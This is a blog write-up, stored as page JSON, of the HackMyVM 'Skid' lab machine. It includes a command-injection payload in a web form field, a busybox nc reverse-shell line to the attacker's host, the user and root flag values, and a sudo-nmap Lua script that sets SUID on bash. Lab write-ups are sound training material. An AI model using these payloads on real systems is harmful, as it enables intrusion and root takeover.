{"pageProps":{"postData":{"id":"HackMyVMSkid","contentHtml":"<h1>Skid.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Skid\">https://hackmyvm.eu/machines/machine.php?vm=Skid</a></p>\n</blockquote>\n<p><img src=\"/post-images/HackMyVMSkid/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<p>端口扫描</p>\n<pre><code class=\"hljs language-jsx\">➜  <span class=\"hljs-title class_\">Skid</span> nmap -p- -n -<span class=\"hljs-title class_\">Pn</span> -sV <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.101</span> -min-rate <span class=\"hljs-number\">10000</span> \n<span class=\"hljs-title class_\">Starting</span> <span class=\"hljs-title class_\">Nmap</span> <span class=\"hljs-number\">7.95</span> ( <span class=\"hljs-attr\">https</span>:<span class=\"hljs-comment\">//nmap.org ) at 2025-12-03 10:33 CST</span>\n<span class=\"hljs-title class_\">Nmap</span> scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.101</span>\n<span class=\"hljs-title class_\">Host</span> is <span class=\"hljs-title function_\">up</span> (<span class=\"hljs-number\">0.</span>00032s latency).\n<span class=\"hljs-title class_\">Not</span> <span class=\"hljs-attr\">shown</span>: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_\">ports</span> (reset)\n<span class=\"hljs-variable constant_\">PORT</span>     <span class=\"hljs-variable constant_\">STATE</span> <span class=\"hljs-variable constant_\">SERVICE</span> <span class=\"hljs-variable constant_\">VERSION</span>\n<span class=\"hljs-number\">22</span>/tcp   open  ssh     <span class=\"hljs-title class_\">OpenSSH</span> <span class=\"hljs-number\">8.</span>2p1 <span class=\"hljs-title class_\">Ubuntu</span> 4ubuntu0<span class=\"hljs-number\">.11</span> (<span class=\"hljs-title class_\">Ubuntu</span> <span class=\"hljs-title class_\">Linux</span>; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">5000</span>/tcp open  http    <span class=\"hljs-title class_\">Werkzeug</span> httpd <span class=\"hljs-number\">3.0</span><span class=\"hljs-number\">.6</span> (<span class=\"hljs-title class_\">Python</span> <span class=\"hljs-number\">3.8</span><span class=\"hljs-number\">.10</span>)\n<span class=\"hljs-variable constant_\">MAC</span> <span class=\"hljs-title class_\">Address</span>: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:0<span class=\"hljs-attr\">A</span>:0<span class=\"hljs-attr\">E</span>:<span class=\"hljs-number\">92</span> (<span class=\"hljs-variable constant_\">PCS</span> <span class=\"hljs-title class_\">Systemtechnik</span>/<span class=\"hljs-title class_\">Oracle</span> <span class=\"hljs-title class_\">VirtualBox</span> virtual <span class=\"hljs-variable constant_\">NIC</span>)\n<span class=\"hljs-title class_\">Service</span> <span class=\"hljs-title class_\">Info</span>: <span class=\"hljs-attr\">OS</span>: <span class=\"hljs-title class_\">Linux</span>; <span class=\"hljs-attr\">CPE</span>: <span class=\"hljs-attr\">cpe</span>:/<span class=\"hljs-attr\">o</span>:<span class=\"hljs-attr\">linux</span>:linux_kernel\n\n<span class=\"hljs-title class_\">Service</span> detection performed. <span class=\"hljs-title class_\">Please</span> report any incorrect results at <span class=\"hljs-attr\">https</span>:<span class=\"hljs-comment\">//nmap.org/submit/ .</span>\n<span class=\"hljs-title class_\">Nmap</span> <span class=\"hljs-attr\">done</span>: <span class=\"hljs-number\">1</span> <span class=\"hljs-variable constant_\">IP</span> <span class=\"hljs-title function_\">address</span> (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">7.51</span> seconds\n</code></pre>\n<p>5000 端口是 HTTP，对其进行目录扫描，能找到一些有趣的目录</p>\n<p><img src=\"/post-images/HackMyVMSkid/image1.png\" alt=\"image.png\"></p>\n<h2>命令注入</h2>\n<p>看一下scan 的源码，可以看到需要 target 参数</p>\n<pre><code class=\"hljs language-jsx\">➜  <span class=\"hljs-title class_\">Skid</span> curl <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.101</span>:<span class=\"hljs-number\">5000</span>/scan                                                \n&#x3C;!<span class=\"hljs-variable constant_\">DOCTYPE</span> html>\n&#x3C;html>\n&#x3C;head>\n    &#x3C;title>Jeremy's Hacker Panel&#x3C;/title>\n    &#x3C;link rel=\"stylesheet\" href=\"/static/style.css\">\n&#x3C;/head>\n&#x3C;body>\n\n&#x3C;nav>\n    &#x3C;a href=\"/\">Home&#x3C;/a>\n    &#x3C;a href=\"/scan\">Nmap Scan&#x3C;/a>\n    &#x3C;a href=\"/payload\">Reverse Shell&#x3C;/a>\n&#x3C;/nav>\n\n&#x3C;div class=\"container\">\n    \n&#x3C;h2>Nmap Scanner&#x3C;/h2>\n\n&#x3C;form method=\"POST\">\n    Target:\n    &#x3C;input type=\"text\" name=\"target\">\n    &#x3C;button type=\"submit\">Scan&#x3C;/button>\n&#x3C;/form>\n</code></pre>\n<p>测试命令注入，可以看到回显了 whoami 的信息，显示当前账户是 <code>jeremy</code></p>\n<pre><code class=\"hljs language-jsx\">➜  <span class=\"hljs-title class_\">Skid</span> curl <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.101</span>:<span class=\"hljs-number\">5000</span>/scan -X <span class=\"hljs-variable constant_\">POST</span> -d <span class=\"hljs-string\">'target=127.0.0.1;whoami'</span>\n......\n\n&#x3C;pre><span class=\"hljs-title class_\">Starting</span> <span class=\"hljs-title class_\">Nmap</span> <span class=\"hljs-number\">7.80</span> ( <span class=\"hljs-attr\">https</span>:<span class=\"hljs-comment\">//nmap.org ) at 2025-12-03 02:59 UTC</span>\n<span class=\"hljs-title class_\">Nmap</span> scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-title function_\">localhost</span> (<span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>)\n<span class=\"hljs-title class_\">Host</span> is <span class=\"hljs-title function_\">up</span> (<span class=\"hljs-number\">0.</span>000028s latency).\n<span class=\"hljs-title class_\">Not</span> <span class=\"hljs-attr\">shown</span>: <span class=\"hljs-number\">998</span> closed ports\n<span class=\"hljs-variable constant_\">PORT</span>     <span class=\"hljs-variable constant_\">STATE</span> <span class=\"hljs-variable constant_\">SERVICE</span>\n<span class=\"hljs-number\">22</span>/tcp   open  ssh\n<span class=\"hljs-number\">5000</span>/tcp open  upnp\n\n<span class=\"hljs-title class_\">Nmap</span> <span class=\"hljs-attr\">done</span>: <span class=\"hljs-number\">1</span> <span class=\"hljs-variable constant_\">IP</span> <span class=\"hljs-title function_\">address</span> (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">0.03</span> seconds\njeremy\n</code></pre>\n<p>进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-jsx\">curl <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.101</span>:<span class=\"hljs-number\">5000</span>/scan -X <span class=\"hljs-variable constant_\">POST</span> -d <span class=\"hljs-string\">'target=127.0.0.1;busybox nc 192.168.56.102 4444 -e /bin/bash'</span>\n</code></pre>\n<p><img src=\"/post-images/HackMyVMSkid/image2.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-jsx\">jeremy@<span class=\"hljs-attr\">skid</span>:~$ cat user.<span class=\"hljs-property\">txt</span> \nhmv{7609a0e2e5bf272609dd3e12727eed76}\n</code></pre>\n<h2>提权</h2>\n<p><code>jeremy</code> 用户家目录下有挺多有意思的东西</p>\n<pre><code class=\"hljs language-jsx\">jeremy@<span class=\"hljs-attr\">skid</span>:~$ ls -al\ntotal <span class=\"hljs-number\">72</span>\ndrwxr-xr-x <span class=\"hljs-number\">9</span> jeremy jeremy  <span class=\"hljs-number\">4096</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">59</span> .\ndrwxr-xr-x <span class=\"hljs-number\">3</span> root   root    <span class=\"hljs-number\">4096</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">13</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">45</span> ..\ndrwxrwxr-x <span class=\"hljs-number\">4</span> jeremy jeremy  <span class=\"hljs-number\">4096</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">22</span> app\nlrwxrwxrwx <span class=\"hljs-number\">1</span> root   root       <span class=\"hljs-number\">9</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">20</span> .<span class=\"hljs-property\">bash_history</span> -> <span class=\"hljs-regexp\">/dev/</span><span class=\"hljs-literal\">null</span>\n-rw-r--r-- <span class=\"hljs-number\">1</span> jeremy jeremy   <span class=\"hljs-number\">220</span> <span class=\"hljs-title class_\">Feb</span> <span class=\"hljs-number\">25</span>  <span class=\"hljs-number\">2020</span> .<span class=\"hljs-property\">bash_logout</span>\n-rw-r--r-- <span class=\"hljs-number\">1</span> jeremy jeremy  <span class=\"hljs-number\">3796</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">42</span> .<span class=\"hljs-property\">bashrc</span>\ndrwx------ <span class=\"hljs-number\">3</span> jeremy jeremy  <span class=\"hljs-number\">4096</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">09</span> .<span class=\"hljs-property\">cache</span>\n-rw-rw-r-- <span class=\"hljs-number\">1</span> jeremy jeremy  <span class=\"hljs-number\">1056</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">59</span> changes.<span class=\"hljs-property\">txt</span>\ndrwxrwxr-x <span class=\"hljs-number\">2</span> jeremy jeremy  <span class=\"hljs-number\">4096</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">13</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">49</span> hacking-tools\ndrwx------ <span class=\"hljs-number\">4</span> jeremy jeremy  <span class=\"hljs-number\">4096</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">09</span> .<span class=\"hljs-property\">local</span>\n-rw-r--r-- <span class=\"hljs-number\">1</span> jeremy jeremy   <span class=\"hljs-number\">807</span> <span class=\"hljs-title class_\">Feb</span> <span class=\"hljs-number\">25</span>  <span class=\"hljs-number\">2020</span> .<span class=\"hljs-property\">profile</span>\n-rw-rw-r-- <span class=\"hljs-number\">1</span> jeremy jeremy    <span class=\"hljs-number\">75</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">25</span> .<span class=\"hljs-property\">selected_editor</span>\ndrwx------ <span class=\"hljs-number\">2</span> jeremy jeremy  <span class=\"hljs-number\">4096</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">13</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">45</span> .<span class=\"hljs-property\">ssh</span>\n-rw-r--r-- <span class=\"hljs-number\">1</span> jeremy jeremy     <span class=\"hljs-number\">0</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">13</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">46</span> .<span class=\"hljs-property\">sudo_as_admin_successful</span>\n-rw-rw-r-- <span class=\"hljs-number\">1</span> jeremy jeremy    <span class=\"hljs-number\">38</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">51</span> user.<span class=\"hljs-property\">txt</span>\ndrwxr-xr-x <span class=\"hljs-number\">2</span> jeremy jeremy  <span class=\"hljs-number\">4096</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">32</span> .<span class=\"hljs-property\">vim</span>\n-rw------- <span class=\"hljs-number\">1</span> jeremy jeremy <span class=\"hljs-number\">11223</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">59</span> .<span class=\"hljs-property\">viminfo</span>\ndrwxrwxr-x <span class=\"hljs-number\">2</span> jeremy jeremy  <span class=\"hljs-number\">4096</span> <span class=\"hljs-title class_\">Nov</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span> wordlists\n</code></pre>\n<p>查看 sudo 信息，不对</p>\n<pre><code class=\"hljs language-jsx\">jeremy@<span class=\"hljs-attr\">skid</span>:~$ sudo -l\n<span class=\"hljs-title class_\">Matching</span> <span class=\"hljs-title class_\">Defaults</span> entries <span class=\"hljs-keyword\">for</span> jeremy on <span class=\"hljs-attr\">skid</span>:\n    env_reset, mail_badpass,\n    secure_path=<span class=\"hljs-regexp\">/usr/</span>local/sbin\\:<span class=\"hljs-regexp\">/usr/</span>local/bin\\:<span class=\"hljs-regexp\">/usr/</span>sbin\\:<span class=\"hljs-regexp\">/usr/</span>bin\\:<span class=\"hljs-regexp\">/sbin\\:/</span>bin\\:<span class=\"hljs-regexp\">/snap/</span>bin\n\n<span class=\"hljs-title class_\">User</span> jeremy may run the following commands on <span class=\"hljs-attr\">skid</span>:\n    (root) <span class=\"hljs-attr\">NOPASSWD</span>: <span class=\"hljs-regexp\">/usr/</span>bin/nmap\n</code></pre>\n<p>666 假的 root.txt</p>\n<pre><code class=\"hljs language-jsx\">jeremy@<span class=\"hljs-attr\">skid</span>:~$ sudo nmap -iL /root/root.<span class=\"hljs-property\">txt</span>\n<span class=\"hljs-title class_\">Starting</span> <span class=\"hljs-title class_\">Nmap</span> <span class=\"hljs-number\">7.80</span> ( <span class=\"hljs-attr\">https</span>:<span class=\"hljs-comment\">//nmap.org ) at 2025-12-03 03:13 UTC</span>\n<span class=\"hljs-title class_\">Failed</span> to resolve <span class=\"hljs-string\">\"Help\"</span>.\n<span class=\"hljs-title class_\">Failed</span> to resolve <span class=\"hljs-string\">\"I\"</span>.\n<span class=\"hljs-title class_\">Failed</span> to resolve <span class=\"hljs-string\">\"lost\"</span>.\n<span class=\"hljs-title class_\">Failed</span> to resolve <span class=\"hljs-string\">\"the\"</span>.\n<span class=\"hljs-title class_\">Failed</span> to resolve <span class=\"hljs-string\">\"root\"</span>.\n<span class=\"hljs-title class_\">Failed</span> to resolve <span class=\"hljs-string\">\"flag!\"</span>.\n<span class=\"hljs-title class_\">Failed</span> to resolve <span class=\"hljs-string\">\"Can\"</span>.\n<span class=\"hljs-title class_\">Failed</span> to resolve <span class=\"hljs-string\">\"you\"</span>.\n<span class=\"hljs-title class_\">Failed</span> to resolve <span class=\"hljs-string\">\"please\"</span>.\n<span class=\"hljs-title class_\">Failed</span> to resolve <span class=\"hljs-string\">\"help\"</span>.\n<span class=\"hljs-title class_\">Failed</span> to resolve <span class=\"hljs-string\">\"me\"</span>.\n<span class=\"hljs-title class_\">Failed</span> to resolve <span class=\"hljs-string\">\"find\"</span>.\n<span class=\"hljs-title class_\">Failed</span> to resolve <span class=\"hljs-string\">\"it?\"</span>.\n<span class=\"hljs-attr\">WARNING</span>: <span class=\"hljs-title class_\">No</span> targets were specified, so <span class=\"hljs-number\">0</span> hosts scanned.\n<span class=\"hljs-title class_\">Nmap</span> <span class=\"hljs-attr\">done</span>: <span class=\"hljs-number\">0</span> <span class=\"hljs-variable constant_\">IP</span> <span class=\"hljs-title function_\">addresses</span> (<span class=\"hljs-number\">0</span> hosts up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">0.02</span> seconds\n</code></pre>\n<p>命令执行提权</p>\n<pre><code class=\"hljs language-jsx\"><span class=\"hljs-variable constant_\">TF</span>=$(mktemp)\necho <span class=\"hljs-string\">'os.execute(\"chmod +s /bin/bash\")'</span> > $TF\nnmap --script=$TF\n</code></pre>\n<p><img src=\"/post-images/HackMyVMSkid/image3.png\" alt=\"image.png\"></p>\n<p>找 <code>root.txt</code> 怀疑文件名都改了，索性直接找 flag 格式</p>\n<p>最后在 <code>/var</code> 中找到，并且文件名没有修改</p>\n<pre><code class=\"hljs language-jsx\">bash-<span class=\"hljs-number\">5.0</span># grep -rE <span class=\"hljs-string\">'hmv{'</span> /<span class=\"hljs-keyword\">var</span> <span class=\"hljs-number\">2</span>><span class=\"hljs-regexp\">/dev/</span><span class=\"hljs-literal\">null</span>\n/<span class=\"hljs-keyword\">var</span>/lib/.<span class=\"hljs-property\">cache2</span>/root.<span class=\"hljs-property\">txt</span>:hmv{1826b83f95bd2ffc5a665bcd54df7ed5}\n</code></pre>\n<h2>总结</h2>\n<p>不难，最后使用 MCP 又打了一遍，两分钟就拿到了 <code>user</code> ，有点强了</p>\n<p><img src=\"/post-images/HackMyVMSkid/image4.png\" alt=\"image.png\"></p>","title":"HackMyVM - Skid","date":"2025-12-03","updated":"2025-12-03","tags":["HackMyVM","Linux","CommandInjuction","Nmap"],"categories":"靶机","comments":true,"description":"Skid. https://hackmyvm.eu/machines/machine.php?vm=Skid Recon 端口扫描 5000 端口是 HTTP，对其进行目录扫描，能找到一些有趣的目录 命令注入 看一下scan 的源码，可以看到需要 target 参数 测试命令注入，可以看到回显了 w..."},"recentPosts":[{"id":"Machinevictorique","title":"Machine - victorique","date":"2025-12-13","isEncrypted":true,"year":"2025","month":"12","day":"13"},{"id":"TheHackersLabsKoi Stealer","title":"TheHackersLabs - Koi Stealer","date":"2025-12-06","isEncrypted":false,"year":"2025","month":"12","day":"06"},{"id":"HackMyVMSkid","title":"HackMyVM - Skid","date":"2025-12-03","isEncrypted":false,"year":"2025","month":"12","day":"03"},{"id":"群U靶机SudoHome_sunset","title":"群U靶机 - SudoHome","date":"2025-11-23","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"群U靶机Yibasuo","title":"群U靶机 - Yibasuo","date":"2025-11-22","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"HackMyVMHunter","title":"HackMyVM - Hunter","date":"2025-11-21","isEncrypted":false,"year":"2025","month":"11","day":"21"},{"id":"HackTheBoxSeason9 - NanoCorp","title":"HackTheBox - Season9 - NanoCorp","date":"2025-11-14","isEncrypted":true,"year":"2025","month":"11","day":"14"}]},"__N_SSG":true}